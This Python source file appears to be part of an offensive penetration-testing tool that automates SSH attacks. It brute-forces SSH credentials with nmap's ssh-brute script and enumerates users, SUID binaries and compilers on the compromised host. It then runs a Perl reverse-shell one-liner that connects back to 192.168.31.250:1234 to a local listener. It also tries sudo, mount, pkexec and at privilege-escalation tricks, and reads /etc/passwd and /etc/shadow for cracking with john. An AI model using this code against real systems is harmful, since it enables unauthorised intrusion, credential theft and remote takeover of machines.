import socket
import sys
import click
import paramiko
import re
import threading
from PyInquirer import prompt
from examples import custom_style_2
from termcolor import colored
from password import credential_scan
from utils import find_suid_binaries, check_useful_binaries, check_compiler
from helper.questions import ssh_question

processes = []


def ssh_connect(ip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, port, username, password)
    print(colored('\n' + 'SSH connected.', attrs=['bold']))
    print('\n----------------------------------------------------\n')
    nextQuestion = True
    while nextQuestion:
        answer = prompt(ssh_question(), style=custom_style_2).get('scan')
        if answer == 'user list':
            stdin, stdout, stderr = ssh.exec_command(
                'getent passwd | awk -F: \'{ print $1}\'')
            outlines = stdout.readlines()
            if len(outlines) > 0:
                print(colored('User list: \n', attrs=['bold']))
                for user in outlines:
                    click.echo(user.replace('\n', ''))
                print('\n----------------------------------------------------\n')
        elif answer == 'suid binaries':
            stdin, stdout, stderr = ssh.exec_command(find_suid_binaries(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                print(colored('SUID Binaries: \n', attrs=['bold']))
                for path in outlines:
                    print(path.replace('\n', ''))
                print('\n----------------------------------------------------\n')
        elif answer == 'useful binaries':
            stdin, stdout, stderr = ssh.exec_command(check_useful_binaries(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                print(colored('Useful binaries: \n',  attrs=['bold']))
                for binary in outlines:
                    print(binary.replace('\n', ''))
                print('\n----------------------------------------------------\n')
        elif answer == 'available compilers':
            stdin, stdout, stderr = ssh.exec_command(check_compiler(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                print(colored('Available compilers: \n', attrs=['bold']))
                compilers = []
                for compiler in outlines:
                    compilers.append(compiler.replace('\n', '').split(' '))
                compiler_path = []
                for compiler in compilers:
                    tmp_compiler = ''
                    for item in compiler:
                        if len(item) > 0:
                            tmp_compiler += item + ' '
                    compiler_path.append(tmp_compiler)
                for compiler in compiler_path:
                    print(compiler)
                print('\n----------------------------------------------------\n')
        elif answer == 'reverse shell':
            def send_commands(conn):
                while True:
                    cmd = input()
                    if cmd == 'quit':
                        conn.close()
                        server.close()
                        sys.exit()
                    if len(str.encode(cmd)) > 0:
                        conn.send(str.encode(cmd))
                        client_response = str(conn.recv(1024), "utf-8")
                        print(client_response, end="")
            # 2
            bind_ip = '0.0.0.0'
            bind_port = 1234
            serv_add = (bind_ip, bind_port)
            # 3
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((serv_add))
            server.listen(5)
            print("[*] listening on {}:{}".format(bind_ip, bind_port))
            #ssh.exec_command('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.250",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' &')
            ssh.exec_command(
                'perl -e \'use Socket;$i="192.168.31.250";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'')
            # 4
            conn, addr = server.accept()
            print('accepted connection from {} and port {}'.format(
                addr[0], addr[1]))
            print("enter the commands below")
            # 5
            send_commands(conn)
        elif answer == 'available credentials':
            stdin, stdout, stderr = ssh.exec_command(find_suid_binaries(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                for path in outlines:
                    if path == '/usr/bin/sudo':
                        ssh.exec_command('sudo su')
                    elif path == '/bin/mount':
                        ssh.exec_command(
                            'sudo mount -o bind /bin/sh /bin/mount')
                        ssh.exec_command('sudo mount')
                    elif path == '/usr/bin/pkexec':
                        ssh.exec_command('sudo pkexec /bin/sh')
                    elif path == '/usr/bin/pkexec':
                        ssh.exec_command('COMMAND=id')
                        ssh.exec_command('echo "$COMMAND" | at now')
                        ssh.exec_command(
                            'sudo echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null')
                etc_password = []
                etc_shadow = []
                stdin, stdout, stderr = ssh.exec_command(
                    'sudo cat /etc/passwd')
                etc_password = stdout.readlines()
                stdin, stdout, stderr = ssh.exec_command(
                    'sudo cat /etc/shadow')
                etc_shadow = stdout.readlines()
                credential_scan(etc_password, etc_shadow)
                print('\n----------------------------------------------------\n')
        elif answer == 'continue':
            nextQuestion = False
    # subprocess.run(["unshadow", "./utils/ssh/etc_password.txt",
    #               "./utils/ssh/etc_shadow.txt", ">", "./utils/ssh/john.txt"])
    # subprocess.run(["john", "--wordlist=./utils/ssh/passwords.txt",
    #               "./utils/ssh/john.txt"])
    # stdin, stdout, stderr = ssh.exec_command('ps aux | head -1; ps aux | sort -rnk 4 | head -5')
    # outlines = stdout.readlines()
    # for process in outlines:
    #    row = process.replace('\n', '').split(' ')
    #    for element in row:
    #        if len(element) == 0:
    #            row.remove(element)
    #    print(row)
    #    processes.append(row)
    # print(processes)


def get_ssh_access(ip, nmScan):
    if ip == 'localhost':
        ip = '127.0.0.1'
    print(colored('\nGet SSH access:', attrs=['bold']))
    nmScan.scan(
        ip, arguments='-p 22 --script ssh-brute --script-args userdb=./utils/word_lists/users.txt,passdb=./utils/word_lists/passwords.txt')
    result = nmScan[ip]['tcp'][22]['script']['ssh-brute']
    if 'Valid credentials' in result:
        print(colored(result, 'green'))
        valid_credential = re.finditer(r"\w+:\w+", result, re.MULTILINE)
        for match in valid_credential:
            return match.group()
    else:
        print(result)
